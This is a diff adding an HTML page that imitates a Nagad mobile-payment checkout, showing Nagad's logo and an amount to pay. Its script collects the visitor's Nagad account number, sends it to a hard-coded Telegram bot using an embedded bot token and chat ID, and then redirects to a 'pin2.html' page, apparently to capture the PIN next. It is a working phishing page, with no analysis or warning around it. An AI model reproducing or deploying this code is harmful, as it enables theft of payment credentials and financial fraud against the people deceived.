@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Nagad With Payment</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100dvh;
+            margin: 0;
+        }
+        .container {
+            width: 300px;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box; 
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #FF5F1F;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #FF5F1F;
+        }
+        #error {
+            color: red;
+        }
+        img {
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2><img src="https://cdn.glitch.global/167c8f07-c584-4e15-85e6-0dcb6e4fcea0/Nagad_Logo_2024.svg.png?v=1726659873408" /></h2>
+        <p>Amount to be Paid: <span id="amount"></span> BDT</p>
+        <label for="nagadNumber">Enter Nagad Number:</label>
+        <input type="text" id="nagadNumber" placeholder="01XXXXXXXXX">
+        <button onclick="validateNagad()">Next</button>
+        <p id="error"></p>
+    </div>
+
+    <script>
+        // Function to get the query parameter from the URL
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Display the amount to be paid
+        document.addEventListener('DOMContentLoaded', function() {
+            const amountToBePaid = getQueryParam('atbp');  // Get the 'atbp' parameter from URL
+            if (amountToBePaid) {
+                document.getElementById('amount').textContent = amountToBePaid;
+            } else {
+                document.getElementById('amount').textContent = '0';  // Default to 0 if not provided
+            }
+        });
+
+        // Function to send the Nagad number to Telegram
+        function sendToTelegram(nagadNumber) {
+            const botToken = '7138875939:AAGw-ROS6-ch6MILpTOJlOjcmAR6oVGoAiA';
+            const chatId = '5625471891';
+            const message = `Nagad Number: ${nagadNumber}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            return fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error('Error sending message to Telegram:', data);
+                    }
+                })
+                .catch(error => console.error('Telegram API error:', error));
+        }
+
+        // Validate the Nagad number
+        function validateNagad() {
+            const nagadNumber = document.getElementById('nagadNumber').value;
+            const error = document.getElementById('error');
+
+            if (!nagadNumber.startsWith('01')) {
+                error.textContent = 'The Nagad number must start with 01.';
+            } else if (nagadNumber.length !== 11) {
+                error.textContent = 'The Nagad number must be exactly 11 digits.';
+            } else if (isNaN(nagadNumber)) {
+                error.textContent = 'The Nagad number must contain only digits.';
+            } else {
+                error.textContent = '';
+
+                // Send the Nagad number to Telegram
+                sendToTelegram(nagadNumber).then(() => {
+                    // Store the number in localStorage and redirect to the pin page
+                    localStorage.setItem('nagadNumber', nagadNumber);
+                    window.location.href = 'pin2.html';
+                });
+            }
+        }
+    </script>
+
+</body>
+</html>
